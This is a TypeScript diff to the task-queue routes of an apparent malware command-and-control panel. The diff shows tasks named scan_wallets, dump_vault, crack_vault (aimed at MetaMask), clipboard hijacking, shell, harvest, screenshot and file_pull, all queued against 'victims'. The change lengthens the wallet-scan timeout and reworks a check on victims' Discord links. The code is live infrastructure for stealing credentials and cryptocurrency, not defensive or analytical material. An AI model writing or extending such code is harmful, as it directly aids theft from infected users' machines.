@@ -6,6 +6,7 @@ import { bad, HttpError, notFound } from '../lib/errors';
 import { bridgeStatus } from '../services/discord-bridge';
 import { requireRole } from '../plugins/auth';
 import { publish } from '../lib/bus';
+import { taskLinkError } from '../lib/tasks';
 
 const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel'] as const;
 
@@ -19,7 +20,7 @@ const enqueueSchema = z.object({
 });
 
 const templates = [
-  { name: 'scan_wallets', label: 'Scan wallets', params: {}, timeout_sec: 120 },
+  { name: 'scan_wallets', label: 'Scan wallets', params: {}, timeout_sec: 300 },
   { name: 'dump_vault', label: 'Dump vault', params: { target: 'metamask' }, timeout_sec: 300 },
   { name: 'crack_vault', label: 'Crack vault', params: { target: 'metamask', max_seconds: 90 }, timeout_sec: 180 },
   { name: 'clip_start', label: 'Start clipboard', params: { replace: false }, timeout_sec: 30 },
@@ -64,15 +65,15 @@ export const taskRoutes: FastifyPluginAsync = async (app) => {
     });
     if (victims.length === 0) throw bad('no_victims', 'no live victim in selection');
     if (bridgeStatus().enabled) {
-      const unlinked = victims.filter((victim) => !victim.discord);
-      if (unlinked.length > 0) {
-        throw new HttpError(
-          422,
-          'discord_unlinked',
-          `no Discord link: ${unlinked.map((victim) => victim.hostname).join(', ')}`,
-          0,
-          { victim_ids: unlinked.map((victim) => victim.id) }
-        );
+      const ignored = new Set((await prisma.discordIgnore.findMany({
+        where: { channelId: { in: victims.map((victim) => victim.discord?.channelId).filter((id): id is string => Boolean(id)) } },
+        select: { channelId: true }
+      })).map((row) => row.channelId));
+      const linkedError = taskLinkError(victims, ignored);
+      if (linkedError) {
+        throw new HttpError(linkedError.status, linkedError.code, linkedError.message, 0, {
+          victim_ids: linkedError.victim_ids
+        });
       }
     }
     const notBefore = input.not_before ? new Date(input.not_before) : new Date();
